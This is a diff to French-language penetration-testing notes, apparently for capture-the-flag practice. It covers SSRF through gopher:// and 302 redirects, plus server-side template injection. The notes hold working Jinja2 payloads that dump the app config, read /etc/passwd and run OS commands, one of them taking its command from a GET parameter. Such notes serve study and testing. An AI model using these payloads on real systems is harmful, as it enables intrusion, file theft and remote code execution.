@@ -8,6 +8,7 @@ gopher://dateserver.htb:80/_POST%20/admin.php%20HTTP%2F1.1%0D%0AHost:%20dateserv
 ```
 [Gopherus](https://github.com/Esonhugh/Gopherus3) pour automatiser
 
+* 302 Redirect. Peut rediriger un SSRF et contourner une mesure de sécurité sur le lien fournis.
 
 ## Server-side Template Injection (SSTI)
 Code doit être injecté **avant le rendu** pour qu'il soit exécuté lors de la phase de rendu.
@@ -15,15 +16,20 @@ Détection: `${{<%[%'"}}%\.` devrait violer la syntaxe du template.
 [PayloadAllTheThings CheatSheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
 ![[diagram.webp]]
 
-Jinja = 777777
+Jinja2 = 777777
 twig =49
 
 ### Jinja2
 ```jinja2
+#config
 {{ config.items() }}
 {{ self.__init__.__globals__.__builtins__ }}
+#Lecture fichier
 {{ self.__init__.__globals__.__builtins__.open("/etc/passwd").read() }}
+#Exécution de code
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
+#Exécution de code (ajouter un param GET "input"
+{% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(request.args.input).read()}}{%endif%}{%endfor%}
 ```
 ### Twig
 Attention aux espaces. Utiliser `\x20` dans les strings.
